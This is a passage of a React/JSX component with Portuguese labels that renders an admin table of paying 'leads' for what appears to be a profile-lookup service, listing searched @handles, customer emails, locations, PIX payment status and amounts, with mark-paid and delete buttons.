                <tr>
                  <th className="px-4 py-3">Alvo Pesquisado</th>
                  <th className="px-4 py-3">Contato / E-mail</th>
                  <th className="px-4 py-3">Origem</th>
                  <th className="px-4 py-3">Status</th>
                  <th className="px-4 py-3">Valor</th>
                  <th className="px-4 py-3 text-right">Ação</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#262626]">
                {filteredLeads.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-4 py-8 text-center text-gray-500">
                      Nenhum registro encontrado.
                    </td>
                  </tr>
                ) : (
                  filteredLeads.map((lead) => (
                    <tr key={lead.id} className="hover:bg-[#181818]/60 transition-colors">
                      {/* Target */}
                      <td className="px-4 py-3.5">
                        <div className="flex items-center gap-2.5">
                          <img
                            src={lead.targetPic || '/perfil.jpg'}
                            alt={lead.target}
                            className="w-8 h-8 rounded-full object-cover border border-[#363636]"
                          />
                          <div>
                            <span className="font-bold text-white block">@{lead.target}</span>
                            <span className="text-[10px] text-[#737373] font-mono">{lead.createdAt || 'Recente'}</span>
                          </div>
                        </div>
                      </td>

                      {/* Customer */}
                      <td className="px-4 py-3.5">
                        <span className="text-gray-300 block">{lead.email || 'Anônimo'}</span>
                      </td>

                      {/* Location */}
                      <td className="px-4 py-3.5 text-[#a8a8a8]">
                        {lead.city ? `${lead.city} - ${lead.state}` : 'Brasil'}
                      </td>

                      {/* Status */}
                      <td className="px-4 py-3.5">
                        {lead.status === 'pagou' ? (
                          <span className="bg-green-500/15 text-green-400 border border-green-500/30 text-[10px] font-bold px-2 py-0.5 rounded-full">
                            PAGOU
                          </span>
                        ) : lead.status === 'gerou_pix' ? (
                          <span className="bg-amber-500/15 text-amber-400 border border-amber-500/30 text-[10px] font-bold px-2 py-0.5 rounded-full">
                            GEROU PIX
                          </span>
                        ) : (
                          <span className="bg-gray-800 text-gray-400 border border-gray-700 text-[10px] font-bold px-2 py-0.5 rounded-full">
                            PESQUISOU
                          </span>
                        )}
                      </td>

                      {/* Amount */}
                      <td className="px-4 py-3.5 font-mono font-bold text-white">
                        R$ {(lead.amount || 27.90).toFixed(2).replace('.', ',')}
                      </td>

                      {/* Actions */}
                      <td className="px-4 py-3.5 text-right space-x-2">
                        {lead.status !== 'pagou' && (
                          <button
                            onClick={() => updateLeadStatus(lead.id, 'pagou')}
                            title="Marcar como Pago"
                            className="p-1.5 bg-green-500/15 hover:bg-green-500/30 text-green-400 rounded-lg border border-green-500/30 transition-colors cursor-pointer"
                          >
                            <CheckCircle2 size={15} />
                          </button>
                        )}

                        <button
                          onClick={() => deleteLead(lead.id)}
                          title="Excluir Registro"
                          className="p-1.5 bg-[#262626] hover:bg-[#363636] text-[#a8a8a8] hover:text-white rounded-lg border border-[#363636] transition-colors cursor-pointer"
                        >
                          <Trash2 size={15} />
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
